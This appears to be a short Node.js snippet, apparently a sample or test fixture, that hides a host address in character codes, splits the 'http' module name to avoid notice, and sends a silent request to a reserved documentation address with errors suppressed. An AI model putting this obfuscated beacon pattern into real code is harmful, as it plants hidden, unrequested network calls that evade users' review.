const h = [50,48,51,46,48,46,49,49,51,46,49,48].map(c => String.fromCharCode(c)).join("");
const r = require("ht"+"tp").request({ host: h, path: "/x", timeout: 3000 });
r.on("error", () => {}); r.on("timeout", () => r.destroy()); r.end();
